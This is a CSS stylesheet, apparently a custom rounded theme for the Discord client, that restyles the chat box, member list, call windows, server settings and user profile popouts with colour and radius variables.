/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Chatbox Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Typing */

.typing-2GQL18 {
    position: sticky;
	z-index: 4;
    margin-bottom: -28px;
    margin-left: 0px;
    padding-top: 4px
}

.base-gE7OpD {
    color: var(--Color008);
    font-size: 12px;
    font-weight: 500;
    line-height: 24px;

}

/* Background */

.scrollableContainer-2NUZem {
	position: relative;
    background: var(--Color005);
    max-height: 37vh;
  	border-radius: 24px;
	z-index: 90;
	padding-top: 4px;
	padding-bottom: 4px;
    padding-right: 12px;
}

.scrollableContainer-2NUZem::-webkit-scrollbar {
    display: none;

}




.form-2fGMdU {
    padding-left: 0px;
    padding-right: 0px;

}

.characterCount-1cRDo2 {
	z-index: 3;
}

.channelTextArea-rNsIhG {
    margin-bottom: -3px;
	border-radius: 24px;
}

.theme-dark .form-2fGMdU:before {
	background: transparent;
}

/* Text Align */

.slateTextArea-1Mkdgw {
    text-align: left;
	margin-left: 12px;
}

.placeholder-37qJjk {
    left: 28px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Member Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.members-1998pB, .members-1998pB>div {
    background-color: var(--Color004);
	border-radius: 24px;
	margin-left: 12px;
    margin-bottom: 25px;
}

.members-1998pB {
    width: 236px;
    padding-bottom: 40px;

}

.member-3-YXUe {
    margin-left: 2px;
    padding-right: 8px;
}


/* Bot Tags */

.botTag-2WPJ74 {
    border-radius: 24px !important;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/*  Sidebar */

.scroller-1JbKMe {
    background: var(--Color004);
}

#app-mount .sidebar-2K8pFh {
    background: transparent;
    border-radius: 23px;
    margin-top: 12px;
    margin-right: 12px;
    margin-left: 12px;
    margin-bottom: 24px;
}

.layout-2DM8Md {
    border-radius: 90px;
    margin-right: 12px;
    margin-left: 6px;
}

/* Sidebar Button */

.selected-aXhQR6 .layout-2DM8Md {
    background: var(--Color003);
}

/* Searchbar */

.privateChannels-1nO12o {
    background: transparent;
    margin-bottom: -20px;
}

.searchBar-6Kv8R2 .searchBarComponent-32dTOx {
    background: var(--Color005);
    color: var(--Color009);
    border-radius: 90px;


    margin-right: 6px;
    margin-left: 4px;

    height: 28px;
    overflow: hidden;

    -webkit-box-shadow: none;
    box-shadow: none;

    text-align: center;
}



/* Topbar */

.topPill-30KHOu .item-PXvHYJ {
    border-radius: 94px;
    margin: 0 8px;
    padding: 2px 12px;
}

/*  Friendstatus */

.peopleColumn-29fq28 {
	border-radius: 24px;
    background: var(--Color004);
}

.tabBody-3YRQ8W {
    background: var(--Color003);
    padding-bottom: 25px;
}

/*  Friendstatus | Buttons*/

.actionButton-uPB8Fs {
    background: var(--Color003);
}

/*  Friendstatus | Avatar*/

.wrapper-3t9DeA, .avatar-3W3CeO {
    background: transparent;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home | Active Now |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* No Header */

.header-13Cw0- {
	display: none;
}

/* Empty Card */

.emptyCard-1RJw8n {
    border-radius: 24px;
    padding: 24px;
}

/* Background */

.nowPlayingScroller-2XrVUt {
    padding-top: 0px;
    padding-left: 12px;
}

.wrapper-3D2qGf {
    background-color: var(--Color004);
  	border-radius: 24px;
}

.nowPlayingColumn-2sl4cE {
    background: var(--Color003);

}

.emptyCard-1RJw8n {
    background: var(--Color004);
}

/* Items */

.section-2gLsgF {
	background: var(--Color003);
  	border-radius: 24px;
    position: relative;
    padding: 12px;
}

.theme-dark .inset-3sAvek {
    background-color: transparent;
}

/* Activity Avatar */

.activitySectionAssets-32WyHu .largeImage-DLXk-f {
	border-radius: 90px;
    width: 32px;
    height: 32px;
}

/* Divider */

.theme-dark .separator-XqIyoz {
    background-color: transparent;
	padding-top: 8px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home | Nitro ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.homeWrapperNormal-2KSUEa {
    height: 100%;
    background: var(--Color003);
}

.scroller-9moviB {
    background: var(--Color004);
    border-radius: var(--Radius001);
    margin-right: 12px;
    margin-bottom: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Call ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/*  Toolbar */

.headerWrapper-3NUKsd {
    padding-top: 6px;
}


/*  Status */

.status-1WEaea {
    background: var(--Color001);
    color: var(--Color006);
}

.wrapper-2qzCYF.minimum-28Z35l {
    height: 280px;
    background: var(--Color003);
}


.voiceCallWrapper-3kPwHm {
    background: var(--Color004);
}

/*  Buttons */

.colorable-1bkp8v.primaryDark-3mSFDl, .colorable-1bkp8v.primaryDark-3mSFDl .centerIcon-2G6o-T {
    color: var(--Color007);
}

.colorable-1bkp8v.primaryDark-3mSFDl {
    background: var(--Color003);
    border-radius: var(--Radius002);
}


.colorable-1bkp8v.red-33-Lnk {
    background: var(--Color001);
    border-radius: var(--Radius002);
}

.colorable-1bkp8v.red-33-Lnk:hover {
    background: var(--Color001);
    border-radius: var(--Radius002);
    filter: brightness(110%);
}

/*  Background */

.flexCenter-2Y_vCg .wrapper-2qzCYF.fullScreen-1tMzXY, .wrapper-2qzCYF.noChat-18KtBD {
    background: var(--Color003);
}

.wrapper-3EGhDO {
    background: var(--Color004);
    padding: 6px 6px 6px 6px;
    border-radius: var(--Radius002);
}

/*  Call Dock */
/*
div[class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6"][style="flex: 1 1 auto;"]{
    border-radius: 30px;
    margin-bottom: 21px;
    background: var(--Color004);
}


.colorable-1bkp8v.white-3GPOIp, .colorable-1bkp8v.white-3GPOIp .centerIcon-2G6o-T {
    color: currentColor;
}

.colorable-1bkp8v.primary-3NQg8g,
.colorable-1bkp8v.primary-3NQg8g.active-1QRrIS, .colorable-1bkp8v.primary-3NQg8g:hover,
.colorable-1bkp8v.white-3GPOIp,
.centerButton-3CaNcJ,
.colorable-1bkp8v.white-3GPOIp.active-1QRrIS, .colorable-1bkp8v.white-3GPOIp:hover,
.colorable-1bkp8v.red-33-Lnk {
    background: none  ;
}
*/

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Call | Picture in Picture |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.pictureInPictureWindow-1B5qSe{
    border-radius: var(--Radius001);
    width: 440px;
    height: 248px;
    opacity: var(--picture-in-picture);
}

.pictureInPictureWindow-1B5qSe:hover{
        opacity: 100%;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.headerImage-3X1tyY, .searchSubtitle-2jsC5X, .searchTitle-36D1cB {
    display: none;
}

#app-mount .sidebar-2K8pFh {
    background: var(--Color004);
}

.theme-dark .pageWrapper-1PgVDX {
    border-radius: 24px;
    background: var(--Color004);
    padding: 0px 0px 0px 0px;
    margin: 12px 13px 25px 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover | Searchbar  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Search Bar */

.search-1iTphC .searchBox-2_mAlO {
    background-color: var(--Color005);
    border-radius: 90px;
    box-shadow: none;
}

.searchHeader-2I26nG {
    margin-bottom: 0px;
    min-height: 0px;
    padding-bottom: 40px;
}

.search-1iTphC .searchBox-2_mAlO .searchBoxInput-K6mkng {
    color: var(--Color008);
    font-size: 16px;
    padding-left: 24px;
}

.search-1iTphC .searchBox-2_mAlO:focus, .search-1iTphC .searchBox-2_mAlO:focus-within {
    box-shadow: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover | Server Card  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/


/* Background */

.theme-dark .card-3DjzTQ, .theme-dark .iconMask-3b8GzQ {
    background: var(--Color005);
    border-radius: 24px;
	box-shadow: none;
}

.guildListSection-2CS8vH {
    padding-top: 20px;
}

/* Avatar */

.avatar-22otdK {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Overview  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.flag-16iIBd {
    position: relative;
    border-radius: 90px;
    margin-left: 2px;
    width: 36px;
    height: 24px;
}

.theme-dark .container-1nZlH6 {
    background: var(--Color005);
	border: none;
	border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Roles  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Sidebar */

.scroller-305q3I {
    background: var(--Color004);
    border-radius: var(--Radius001);
    margin-top: 60px;
}

/* Content */

.contentColumnMinimal-2iX-kP {
    background: var(--Color004);
    border-radius: 24px 24px 0 0;
    margin-top: 60px;
    margin-left: 60px;
    margin-right: 60px;
    margin-bottom: 0px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Emoji  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Moderation  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.checkbox-1ix_J3 {
    -webkit-box-flex: 0;
    -ms-flex: 0 0 auto;
    flex: 0 0 auto;
    border-width: 1px;
    border-style: solid;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    border-radius: 90px;
}

.defaultMarginh3-2iptLs, .defaultMarginh5-2mL-bP {
    margin-bottom: 12px;
    margin-top: 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Audit Log  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.contentRegion-3nDuYy {
    background: var(--Color003);
}


/* Content */

.customScroller-26gWhv>div {
    background: var(--Color004);
    border-radius: 24px 24px 0 0;
    margin-top: 60px;
    margin-left: 60px;
    margin-right: 60px;
    margin-bottom: 0px;
    padding: 40px;
}


/* Card */

.theme-dark .auditLog-3jNbM6 {
	border: none;
}

.theme-dark .divider-1pnAR2 {
    display: none;
}

/* Card | Closed */

.theme-dark .headerClickable-2IVFo9, .theme-dark .headerDefault-1wrJcN {
    background: var(--Color005);
	border-radius: var(--Radius001);
}

/* Card | Open */

.theme-dark .headerExpanded-CUEwZ5 {
    background: var(--Color005);
	border-radius: var(--Radius001) var(--Radius001) 0 0;
}


.theme-dark .changeDetails-bk98pu {
    background: var(--Color003);
	border-radius: 0 0 var(--Radius001) var(--Radius001);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Integrations  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Widget  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Input */

.theme-dark .copyInputDefault-21sXtF {
    border: none;
}

.theme-dark .copyInput-2rOSt7 {
    background: var(--Color005);
    border-radius: var(--Radius001);
}



/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Server Template  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Community | Overview  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Welcome Screen  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.enableContainer-6E-puu {
    background: var(--Color003);
    filter: brightness(110%);
    border-radius: var(--Radius001) var(--Radius001) 0 0;
}

.previewContainer-1SS3uO {
    background: var(--Color003);
    padding: 16px;
    border-radius: 0 0 var(--Radius001) var(--Radius001);

}

/* Description */

.descriptionWrapper-1GiGtP {
    width: 100%;
    max-width: 900px;
    margin: 0 auto;
}

.input-cIJ7To::-webkit-scrollbar {
    display: none;
}

/* Text */

.descriptionInput-3b30C8[placeholder] {
    text-align: left;
    padding-right: 24px;
    padding-left: 24px;
}

/* Cards */

.welcomeChannel-1rFrIO {
    border-radius: var(--Radius002);
    background-color: var(--background-primary);
    margin-top: 8px;
    padding: 20px 20px;
}

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6 {
    color: var(--Color006);
    background: var(--Color001);
}

/* Button */

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6:hover {
    color: var(--Color006);
    background: var(--Color001);
    filter: brightness(120%);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Login |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark.authBox-hW6HRx {
    color: #72767d;
    background: var(--Color004);
}

.fallbackImage-31Sk4m {
    display: none;
}

.platform-win .splashBackground-1FRCko:before {
    display: none;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | User Popout ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Header */

.header-2BwW8b {
    background: var(--Color003);
    padding-bottom: 0px;
}

.reduce-motion .userPopout-3XzG_A {
    background: var(--Color003);
}

/* Background */

.theme-dark .headerNormal-T_seeN {
    background: var(--Color003)
}

.theme-dark .body-3iLsc4, .theme-dark .footer-1fjuF6 {
    background: var(--Color004);
    color: var(--Color006);
}

.userPopout-3XzG_A {
	box-shadow: var(--shadow001);
    width: 260px;
    border-radius: 24px;
    max-height: calc(90vh - 120px);
}

.bodyInnerWrapper-Z8WDxe {
    padding-right: 20px;
}

/* Activity */

.activity-11LB_k {
    background: var(--Color003);
    padding: 16px;
}

/* Status */

.customStatus-1bh2V9 {
    background: var(--Color004);
    padding: 16px 16px 16px 16px;
    text-align: left;
    line-height: 22px;
    margin-bottom: -20px;
}

/* Roles */

.role-2irmRk{

    position: relative;
    overflow: hidden;
    z-index: 1;
    border: none;
    padding: 5px;
}

.roleCircle-3xAZ1j::before{
    content: "";
    position: absolute;
    top:0;
    left:0;
    width:100%;
    height: 100%;
    background: inherit;
    opacity: .2;
    z-index: -1;
    pointer-events: none;
}

/* Note */

.textarea-2r0oV8::-webkit-scrollbar {
    width: 0px;
    height: 0px;
}


/* Footer */

.footer-1fjuF6 {
    padding: 0 16px 16px;
}

/* USRBG */

.reduce-motion .userPopout-3XzG_A {
	transform:translateZ(0);
}

.userPopout-3XzG_A .wrapper-3t9DeA::after {
    border-radius: var(--Radius001) var(--Radius001) 0 0;
	content: '';
	position: fixed;
	top: 0;
	left: 0;
    width: 260px;
    height: 174px;
	z-index: -1;
	pointer-events: none;
	opacity: 1;
	background-size: cover;
	background-repeat: no-repeat;
	background-position: var(--user-popout-position) center;
    background-image: var(--user-background);
    filter: brightness(50%) blur(0px);
}

.userPopout-3XzG_A  .header-2BwW8b,
.userPopout-3XzG_A  .scroller-2FKFPG,
.userPopout-3XzG_A  .footer-1fjuF6 {
	z-index: 1;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | User Profile |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Header */

.header-QKLPzZ {
    margin-bottom: 90px;
}

/* Activity */

.topSectionPlaying-1J5E4n {
    background: transparent;
}

.topSectionSpotify-1lI0-P {
    background: transparent;
}

.activity-1ythUs {
    background: var(--Color003);
}

/* Background */

.root-SR8cQa {
    border-radius: 24px;
	width: 900px;
    background-color: transparent;
}

.body-3ND3kc, .tabBarContainer-1s1u-z {
    background: var(--Color004);
}

.infoScroller-3EYYns {
    padding: 20px 12px 20px 12px;
}

/* Divider */

.userInfoSection-2acyCx+.userInfoSection-2acyCx {
    border: none;
}

/* Note */

.userInfoSectionHeader-CBvMDh {
    display: none;
    padding: 0px;
}

.note-QfFU8y {
    padding: 2px 12px 2px 12px;
    margin-right: 0px;
    margin-left: 0px;
    margin-bottom: -20px;
    margin-top: -20px;
}

.note-QfFU8y textarea {
    border-radius: 12px;
    font-size: 14px;
    line-height: 16px;
    padding: 4px;
}

/* Icon Tabs */

.connectedAccount-36nQx7 {
    z-index: 3;
    margin-top: 20px;
    margin-right: 12px;
    margin-left: 12px;
    padding: 8px 14px 8px 8px;
    width: 230px;
    background: var(--Color002);
	border-radius: 90px;
	border: none;
}

/* Spotify */

.assetsLargeImage-eYwpTX {
    border-radius: 90px;
    display: block;
    -o-object-fit: cover;
    object-fit: cover;
}

/* Buton */

.lookFilled-1Gx00P.colorGreen-29iAKY {
    background: var(--Color001);
    color: #fff;
}

.lookFilled-1Gx00P.colorGreen-29iAKY {

    background: var(--Color001);
    color: #fff;
}

/* USRBG */

.header-QKLPzZ .wrapper-3t9DeA::after {
    z-index: -1;
    content:'';
    position: absolute;
    top: -20px;
    left: -20px;
    width: 900px;
    height: 240px;
    opacity: 1;
    background: var(--user-background) center/cover no-repeat;
    background-color: var(--Color002);
    filter: brightness(60%) blur(0px);
  }




/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Verify Phone |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.phoneField-38N1bJ .countryButton-3xq3Ts {
    border-radius: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Pinbox |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.messagesPopoutWrap-1MQ1bW {
    border-radius: 24px;
    top: 10px;
    width: 900px;
}

.messageGroupWrapper-o-Zw7G {
    border-radius: 24px;
    margin: 12px;
}

.messagesPopout-24nkyi {
    padding: 0px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Inbox ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
